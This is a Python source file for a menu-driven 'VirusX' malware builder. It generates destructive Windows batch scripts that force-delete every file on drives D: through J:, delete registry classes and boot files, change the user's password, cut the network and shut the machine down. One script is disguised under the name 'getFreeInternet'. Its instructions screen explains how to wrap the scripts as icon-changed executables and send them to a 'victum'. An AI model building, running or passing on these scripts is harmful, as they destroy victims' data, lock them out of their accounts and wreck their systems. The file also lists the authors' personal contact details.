# -*- coding: utf-8 -*-
"""
Created on Sat Dec 17 14:11:20 2022

@author: Mansoor
"""
import os
import time

# colors
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

# logo


def logo():
    os.system('cls')
    print("""
    %s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
    %s┃┈┈┈┣▅╋▅┫┃%s╲╲╲╲╲╲%s| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |  
    %s┃┈┃┈╰━╰━━━━━━╮%s╲╲%s| | ____   ____  | || |     _____    | || |  _______     | || | _____  _____ | || |    _______   | || |  ____  ____  | | 
    %s╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣%s╲%s| ||_  _| |_  _| | || |    |_   _|   | || | |_   __ \    | || ||_   _||_   _|| || |   /  ___  |  | || | |_  _||_  _| | |
    %s╲┃┈CYBER┈┈┈┈▉▉▉%s╲%s| |  \ \   / /   | || |      | |     | || |   | |__) |   | || |  | |    | |  | || |  |  (__ \_|  | || |   \ \  / /   | |
    %s╲┃┈FANTICS┈┈◥▉◤%s╲%s| |   \ \ / /    | || |      | |     | || |   |  __ /    | || |  | '    ' |  | || |   '.___`-.   | || |    > `' <    | |
    %s╲┃┈┈┈┈╭━┳━━━━╯%s╲╲%s| |    \ ' /     | || |     _| |_    | || |  _| |  \ \_  | || |   \ `--' /   | || |  |`\____) |  | || |  _/ /'`\ \_  | |
    %s╲┣━━━━━━┫%s╲╲╲╲╲╲╲%s| |     \_/      | || |    |_____|   | || | |____| |___| | || |    `.__.'    | || |  |_______.'  | || | |____||____| | |
    %s╲┃┈┈┈┈┈┈┃%s╲╲╲╲╲╲╲%s| |              | || |              | || |              | || |              | || |              | || |              | | 
    %s┃┈┈┈┣▅╋▅┫┃%s╲╲╲╲╲╲%s| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
    %s╰━━━╰━━╰╰┳╯%s╯╲╲╲╲╲╲%s '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  
    """ % (k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h)
          )
# Module for loading


def loadingModule(value):
    logo()
    print(m+"\t[+] loading " + value + " , Please wait")
    time.sleep(0.1)
    print('\t[+] loading 10%')
    time.sleep(0.4)
    print('\t[+] loading 30%')
    time.sleep(0.5)
    print('\t[+] loading 35%')
    time.sleep(1)
    print('\t[+] loading 60%')
    time.sleep(1)
    print('\t[+] loading 70%')
    time.sleep(0.4)
    print('\t[+] loading 85%')
    print('\t[+] loading 95%')
    time.sleep(1)
    print('\t[+] loading 100%')
    time.sleep(2)
# instructions


def instructions():
    logo()
    print(
        """
    \t%s[-]%s Follow these steps to convert these viruses into exe
    \n
    \t%s[+]%s Create a virus
    \t%s[+]%s Copy it and paste it in BatToExe Folder
    \t%s[+]%s Drag this file into BatchtoExe.bat file
    \t%s[+]%s Change resultant file icon from properties
    \t%s[+]%s Send this file to your victum
    """ % (h, k, h, b, h, b, h, b, h, b, h, b)
    )
    try:
        os.mkdir("BatchToExe")
        with open('./BatchToExe/batchtoexe.bat', 'w') as fileexe:
            fileexe.write('''
    ;@echo off
;Title Converting batch scripts to file.exe with iexpress
;Mode 75,3 & color 0A
;Rem Original Script https://github.com/npocmaka/batch.scripts/edit/master/hybrids/iexpress/bat2exeIEXP.bat
;echo(
;if "%~1" equ "" (
    ;echo  Usage : Drag and Drop your batch file over this script:"%~nx0"  
    ;Timeout /T 5 /nobreak>nul & Exit
;)
;set "target.exe=%__cd__%%~n1.exe"
;set "batch_file=%~f1"
;set "bat_name=%~nx1"
;set "bat_dir=%~dp1"
;Set "sed=%temp%\2exe.sed"
;echo              Please  wait a while ...  Creating "%~n1.exe" ...
;copy /y "%~f0" "%sed%" >nul
;(
    ;(echo()
    ;(echo(AppLaunched=cmd /c "%bat_name%")
    ;(echo(TargetName=%target.exe%)
    ;(echo(FILE0="%bat_name%")
    ;(echo([SourceFiles])
    ;(echo(SourceFiles0=%bat_dir%)
    ;(echo([SourceFiles0])
    ;(echo(%%FILE0%%=)
;)>>"%sed%"

;iexpress /n /q /m %sed%
;del /q /f "%sed%"
;exit /b 0

[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles

[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
FriendlyName=-
PostInstallCmd=<None>
AdminQuietInstCmd=
    ''')
        fileexe.close()
    except:
        with open('./BatchToExe/batchtoexe.bat', 'w') as fileexe:
            fileexe.write('''
    ;@echo off
;Title Converting batch scripts to file.exe with iexpress
;Mode 75,3 & color 0A
;Rem Original Script https://github.com/npocmaka/batch.scripts/edit/master/hybrids/iexpress/bat2exeIEXP.bat
;echo(
;if "%~1" equ "" (
    ;echo  Usage : Drag and Drop your batch file over this script:"%~nx0"  
    ;Timeout /T 5 /nobreak>nul & Exit
;)
;set "target.exe=%__cd__%%~n1.exe"
;set "batch_file=%~f1"
;set "bat_name=%~nx1"
;set "bat_dir=%~dp1"
;Set "sed=%temp%\2exe.sed"
;echo              Please  wait a while ...  Creating "%~n1.exe" ...
;copy /y "%~f0" "%sed%" >nul
;(
    ;(echo()
    ;(echo(AppLaunched=cmd /c "%bat_name%")
    ;(echo(TargetName=%target.exe%)
    ;(echo(FILE0="%bat_name%")
    ;(echo([SourceFiles])
    ;(echo(SourceFiles0=%bat_dir%)
    ;(echo([SourceFiles0])
    ;(echo(%%FILE0%%=)
;)>>"%sed%"

;iexpress /n /q /m %sed%
;del /q /f "%sed%"
;exit /b 0

[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles

[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
FriendlyName=-
PostInstallCmd=<None>
AdminQuietInstCmd=
    ''')
    fileexe.close()
    ask = input(m+"[+] Enter 1 for menu ")
    if ask == '1':
        firstAsk()

# Ask about options


def firstAsk():
    logo()
    print("""
    \t%s[+]%s Welome to VirusX
    \t%s[+]%s Enter 1 For Virus
    \t%s[+]%s Enter 2 For Instructions to convert into exe
    \t%s[+]%s Enter 3 for group
    \t%s[+]%s Enter anyother key to exit
    """ % (h, k, h, b, h, b, h, b, h, b)
          )
    ask = input(h+"\t[+] ------ ")
    if ask == '1':
        virus()
    elif ask == '2':
        instructions()
    elif ask == '3':
        contact()
    else:
        exit()


def virus():
    os.system('cls')
    logo()

    print("""
    \t%s [-]%s List of the viruses is follow \n\n
    \t%s [1]%s Shutdown computer and whenever user try to turn it on,\n\t  it automatically shutdown after few second
    \t%s [2]%s Change user's laptop password
    \t%s [3]%s Distroy all drives and shutdown computer
    \t%s [4]%s Block internet connection and turn of computer
    \t%s [5]%s Distroy desktop screen
    \t%s [6]%s Request deveolpers for anyother virus
    \t%s [7]%s Back to menu
    \t%s [*]%s Enter anyother key to exit
    """ % (k, p, b, h, b, h, b, h, b, h, b, h, b, h, b, h, b, h)
          )
    ask = input(h+"\t[+] ------ ")
    if ask == '1':
        virus1()
    elif ask == '2':
        virus2()
    elif ask == '3':
        virus3()
    elif ask == '4':
        virus4()
    elif ask == '5':
        virus5()
    elif ask == '6':
        contact()
    elif ask == '7':
        firstAsk()
    else:
        exit()

# shutdown on auto
# only one functionality is remaining which is to add it onto auto


def virus1():
    os.system('cls')
    logo()
    loadingModule("Creating Virus")
    try:
        os.mkdir('shutdown')
        with open('./shutdown/getFreeInternet.bat', 'w') as file:
            file.write(
                '@echo off\ncolor 0a\ntitle Good Day %username%\nshutdown -s -t 10\npause')
            file.close()
    except:
        with open('./shutdown/getFreeInternet.bat', 'w') as file:
            file.write(
                '@echo off\ncolor 0a\ntitle Good Day %username%\nshutdown -s -t 10\npause')
            file.close()
    print("Created Successfully")
    time.sleep(0.5)
    virus()
# change user's laptop password


def virus2():
    os.system('cls')
    logo()
    loadingModule("Creating Virus")
    try:
        os.mkdir("password")
        with open('./password/password.bat', 'w') as password:
            password.write('@echo off\ntitle H`ello %username% I am here on your services\necho 0a\nnet user %username%  PassowerdChanged  && (\nexit\n) || (\ncls\necho failed, Run as administrator\n)\npause')
            password.close()
    except:
        with open('./password/password.bat', 'w') as password:
            password.write('@echo off\ntitle H`ello %username% I am here on your services\necho 0a\nnet user %username%  PassowerdChanged  && (\nexit\n) || (\ncls\necho failed, Run as administrator\n)\npause')
            password.close()
    print('Created Successfully')
    time.sleep(0.5)
    virus()
# distroy all drives and shutdown computer


def virus3():
    os.system('cls')
    logo()
    loadingModule("Creating Virus")
    try:
        os.mkdir("distroyDerives")
        with open('./distroyDerives/drive.bat', 'w') as distroy:
            distroy.write('@echo off\ndel D:\*.* /f /s /q && (\ndel E:\*.* /f /s /q\ndel F:\*.* /f /s /q\ndel G:\*.* /f /s /q\ndel H:\*.* /f /s /q\ndel I:\*.* /f /s /q\ndel J:\*.* /f /s /q\n) || (\ncls \necho Run as Administrator\n)\nshutdown -s -t 10\nexit')
            distroy.close()
        with open('./distroy/registrydelete.bat', 'w') as regist:
            regist.write('@echo off\ntitle Hello %username% I am here on your services\necho 0a\nSTART reg delete HKCR/.exe\n && (\nSTART reg delete HKCR/.dll && (\nSTART reg delete HKCR/*\n) || (\ncls\necho failed run as administrator\n)\n) || (\ncls\necho failed, Run as administrator\n)\ncls\nshutdown -s -t 10\nexit')
            regist.close()
        with open('./distroy/read.txt', 'w') as regist:
            regist.write(
                'Registrydelete file can delete entire registry so victm need to use new window while other can delete entire drives')
            regist.close()
    except:
        with open('./distroyDerives/drive.bat', 'w') as distroy:
            distroy.write('@echo off\ndel D:\*.* /f /s /q && (\ndel E:\*.* /f /s /q\ndel F:\*.* /f /s /q\ndel G:\*.* /f /s /q\ndel H:\*.* /f /s /q\ndel I:\*.* /f /s /q\ndel J:\*.* /f /s /q\n) || (\ncls \necho Run as Administrator\n)\nshutdown -s -t 10\nexit')
            distroy.close()
        with open('./distroy/registrydelete.bat', 'w') as regist:
            regist.write('@echo off\ntitle Hello %username% I am here on your services\necho 0a\nSTART reg delete HKCR/.exe\n && (\nSTART reg delete HKCR/.dll && (\nSTART reg delete HKCR/*\n) || (\ncls\necho failed run as administrator\n)\n) || (\ncls\necho failed, Run as administrator\n)\ncls\nshutdown -s -t 10\nexit')
            regist.close()
        with open('./distroy/read.txt', 'w') as regist:
            regist.write(
                'Registrydelete file can delete entire registry so victm need to use new window while other can delete entire drives')
            regist.close()
    print("Successfully Created")
    time.sleep(0.5)
    virus()
# time.sleep(0.5)Bloc
# k internet Connection


def virus4():
    os.system('cls')
    logo()
    loadingModule("Creating Virus")
    try:
        os.mkdir('BlockInternet')
        with open("./BlockInternet/internet.bat", 'w') as internet:
            internet.write(
                '@echo off\nipconfig /release && (\nmsg Block Your Internet Connection\nshutdown -s -t 10\nmsg You are too stupit) || (\ncls \necho Run as Administrator\n)\nexit')
            internet.close()
    except:
        with open("./BlockInternet/internet.bat", 'w') as internet:
            internet.write(
                '@echo off\nipconfig /release && (\nmsg Block Your Internet Connection\nshutdown -s -t 10\nmsg You are too stupit) || (\ncls \necho Run as Administrator\n)\nexit')
            internet.close()
    print("Created Successfully")
    time.sleep(0.5)
    virus()


def virus5():
    os.system('cls')
    logo()
    loadingModule("Creating Virus")
    try:
        os.mkdir("crushPC")
        with open("./pcVirus/virus.bat", 'w') as virusF:
            virusF.write("@echo off\nattrib -r -s -h c:\autoexec.bat\ndel c:\autoexec.bat && (\nattrib -r -s -h c:\boot.ini\ndel c:\boot.ini\nattrib -r -s -h c:\ntldr\ndel c:\ntldr\nattrib -r -s -h c:\windows\win.ini\ndel c:\windows\win.ini\n) || (\necho Run as Administrator\n)\n shutdown -s -t 10")
            virusF.close()
    except:
        with open("./pcVirus/virus.bat", 'w') as virusF:
            virusF.write("@echo off\nattrib -r -s -h c:\autoexec.bat\ndel c:\autoexec.bat && (\nattrib -r -s -h c:\boot.ini\ndel c:\boot.ini\nattrib -r -s -h c:\ntldr\ndel c:\ntldr\nattrib -r -s -h c:\windows\win.ini\ndel c:\windows\win.ini\n) || (\necho Run as Administrator\n)\n shutdown -s -t 10")
            virusF.close()
    print("Created Successfully")
    time.sleep(0.5)
    virus()
# contact with deveolpers


def mansoor():
    return """
    %s\t\t  Syed Mansoor ul Hassan Bukhari
    %s\t ____________________________________________________
    \t|                                                    |
    \t|%s [+] Gmail      : basitfazi9@gmail.com   %s           |
    \t| %s[+] Contact No : +92-3558608518   %s                 |
    \t| %s[+] Facebook   : free coders house      %s           |
    \t|____________________________________________________|
    """ % (m, b, h, b, h, b, h, b)


def haider():
    return """
    %s\t\t  Haider Ali Khan
    %s\t ____________________________________________________
    \t|                                                    |
    \t|%s [+] Gmail      : officialhaiderali10@gmail.com   %s  |
    \t| %s[+] Contact No : +92-3129643132   %s                 |
    \t| %s[+] Instagram  : _i_haiderali     %s                 |
    \t|____________________________________________________|
    """ % (m, b, h, b, h, b, h, b)


def contact():
    loadingModule("Contact Information")
    os.system('cls')
    logo()
    print(m+"\t\t  Contact Info of Team Cyber Fantics\n")

    print(mansoor())
    print('\n')
    ask = input(m+"[+] Enter 1 for menu ")
    if ask == '1':
        firstAsk()


def run():
    loadingModule(' Tool')
    print('\tEntering into main menu')
    time.sleep(0.5)
    firstAsk()


run()
input()
